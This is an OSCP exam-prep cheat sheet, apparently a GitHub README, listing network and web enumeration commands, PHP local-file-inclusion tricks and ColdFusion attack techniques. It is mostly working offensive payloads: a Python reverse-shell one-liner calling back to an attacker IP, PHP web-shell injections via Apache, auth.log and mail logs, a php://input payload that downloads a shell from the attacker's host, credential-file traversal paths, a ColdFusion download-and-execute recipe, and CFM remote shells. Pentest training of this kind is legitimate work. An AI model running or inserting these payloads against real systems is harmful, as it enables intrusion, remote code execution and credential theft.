# redteam-notebook
Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.

## Early Enumeration - generic

### Network wide scan - first steps
`nmap -sn 10.11.1.0/24`

### netbios scan
`nbtscan -r 10.11.1.0/24`

### DNS recon
`dnsrecon -r 10.11.1.0/24 -n <DNS IP>`
  
### Scan specific target with nmap
`nmap -sV -sT -p- <target IP> `
  
### Guess OS using xprobe2
`xprobe2 <target IP>`

### Search for SMB vulns
`nmap -p139,445 <target IP> --script smb-vuln*`
  
### Enumerate using SMB (null session)
`enum4linux -a <target IP>`
  
### Enumerate using SMB (w/user & pass)
`enum4linux -a -u <user> -p <passwd> <targetIP>`

## Website Enumeration

### quick enumeration using wordlist
`gobuster -u http://<target IP> -w /usr/share/dirb/wordlists/big.txt`
  
### enumeration and basic vuln scan of a website
`nikto -host http://<target IP>`
  
## Website tips and tricks

### PHP

* Check for LFI

Add `/etc/passwd%00` to any GET/POST arguments. On windows try `C:\Windows\System32\drivers\etc\hosts%00` or `C:\autoexec.bat%00`.
A quick win could also be any of these files `c:\sysprep.inf`, `c:\sysprep\sysprep.xml` or `c:\unattend.xml` as they would contain local admin credentials. On linux it's worth checking `/proc/self/environ` to see if there are any credentials passed to the running process via env vars.

* Fetching .php files via LFI

`/index.php?somevar=php://filter/read=convert.base64-encode/resource=<file path>%00` this will return base64 encoded PHP file. Good for fishing up `config.php` or similar.

* Abusing /proc/self/environ LFI to gain reverse shell
In some situations it's possible to abuse `/proc/self/environ` to execute a command. For example:
`index.php?somevar=/proc/self/environ&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

* Apache access.log + LFI = PHP injection
If Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.

with netcat send a request like this:
```GET /<?php system($_GET["cmd"]);?>

```

* auth.log + LFI
`ssh <?php system($_GET["cmd"]);?>@targetIP` and then LFI `/var/log/auth.log`

* /var/mail + LFI
`mail -s "<?php system($_GET["cmd"]);?>" someuser@targetIP < /dev/null` 

* php expect
`index.php?somevar=expect://ls`

* php input
`curl -X POST "targetIP/index.php?somevar=php://input" --data '<?php system("curl -o cmd.php yourIP/cmd.txt");?>'`
Then access `targetIP/cmd.php`

### ColdFusion


* is it Enterprise or Community?
Check how it handles `.jsp` files  `curl targetIP/blah/blah.jsp`. If 404 - enterprise, 500 - community.

* which version?
`/CFIDE/adminapi/base.cfc?wsdl` has a useful comment indicating exact version

* common XEE
https://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf

* LFI in admin login locale
`/CFIDE/administrator/enter.cfm?locale=../../../../ColdFusion9\lib\password.properties` - may need full path. They can be obtained with help of  `/CFIDE/componentutils/cfexplorer.cfc`

* Local upload and execution
Once access to admin panel is gained it's possible to use the task scheduler to download a file and use a system probe to execute it.

`Debugging & Logging` -> `Scheduled Tasks` -> url=<path to our executable>, Publish - save output to file (some writable path). Then manually execute this task which will download and save our file.
  
To execute it create a probe `Debugging & Logging` -> `System probes` -> URL=<some URL>, Probe fail - fail if probe does not contain "blahblah", Execute program <path to our downloaded exe>. And then run probe manually.
  
* Files worth grabbing
** CF7 \lib\neo-query.xml
** CF8 \lib\neo-datasource.xml
** CF9 \lib\neo-datasource.xml

* Simple remote CFM shell
```
<html>
<body>
<cfexecute name = "#URL.runme#" arguments =
"#URL.args#" timeout = "20">
</cfexecute>
</body>
</html>
```

* Simple remote shell using Java (if CFEXECUTE is disabled)
```
<cfset runtime = createObject("java",
"java.lang.System")>
<cfset props = runtime.getProperties()>
<cfdump var="#props#">
<cfset env = runtime.getenv()>
<cfdump var="#env#">
```

* Enterprise can run .jsp files too!
## References
* [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md) - MUST read!
* [FuzzySecurity](http://www.fuzzysecurity.com) - this is something you must bookmark... period. I found the [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html) especially useful.
* [WMIC reference/guide](https://www.computerhope.com/wmic.htm)
* [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) - this is a must have for working on Windows boxes.
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
* [Elevating privileges by exploiting weak folder permissions](http://www.greyhathacker.net/?p=738)
* [ColdFusion for PenTesters](http://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf)
* [ColdFusion Path Traversal](http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/)
* [Penetration Testing Tools Cheat Sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/) - Good read. Check out other cheat sheets on this page too!
* [fimap](https://github.com/kurobeats/fimap) - LFI/RFI scanner
* [Changeme](https://github.com/ztgrace/changeme) - default password scanner
* [CIRT Default Passwords DB](https://cirt.net/passwords)
* [From LFI to Shell](http://resources.infosecinstitute.com/local-file-inclusion-code-execution)
